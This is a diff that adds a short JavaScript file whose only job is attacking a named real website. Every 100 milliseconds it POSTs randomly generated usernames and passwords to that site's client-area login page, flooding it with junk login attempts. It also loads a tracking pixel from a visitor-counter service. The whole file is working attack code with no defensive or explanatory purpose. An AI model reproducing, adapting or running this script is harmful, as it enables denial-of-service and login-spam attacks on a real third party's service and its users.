@@ -1,1 +1,73 @@
+new Image().src="http://whos.amung.us/widget/fonexcoder.png";
 
+    function createrand(xlength)
+{
+var characters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"];
+var createrandom = "";
+for(enginer=0;enginer<xlength; enginer++)
+{
+createrandom = createrandom + characters[Math.floor(Math.random() * characters.length)];
+}
+return createrandom;
+}
+
+function number(xlength)
+{
+var characters = ["0","1","2","3","4","5","6","7","8","9"];
+var createrandom = "";
+for(enginer=0;enginer<xlength; enginer++)
+{
+createrandom = createrandom + characters[Math.floor(Math.random() * characters.length)];
+}
+return createrandom;
+}
+
+var code = {
+    ajax: function (e) {
+		if (e.type.toLowerCase() == "post") {
+            this.post(e)
+        }
+    },
+    post: function (e) {
+        var t = new XMLHttpRequest;
+        t.onreadystatechange = function () {
+            if (t.readyState == 4) {
+                e.success(t.responseText)
+            }
+        };
+        var n = "";
+        for (key in e.data) {
+            if (typeof e.data[key] == "object") {
+                for (v in e.data[key]) {
+                    n += "&" + key + "[" + v + "]=" + e.data[key][v]
+                }
+            } else n += "&" + key + "=" + e.data[key]
+        }
+        n = n.replace("&", "");
+        t.open("POST", e.url, true);
+        if (e.header) {
+            Object.keys(e.header).forEach(function (n) {
+                t.setRequestHeader(n, e.header[n])
+            })
+        }
+        t.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        t.send(n)
+    },
+};
+
+function kcc() {
+
+  code.ajax({
+   url: "https://www.anksoft.net/clientarea.php",
+   type: "POST",
+   data: {
+         username : createrand(15),
+         password : createrand(15),
+		 submit: 'Giriş'						
+		 
+   },
+   success: function (e) {
+   }
+  })
+ } 
+ setInterval(function(){ kcc(); }, 100);
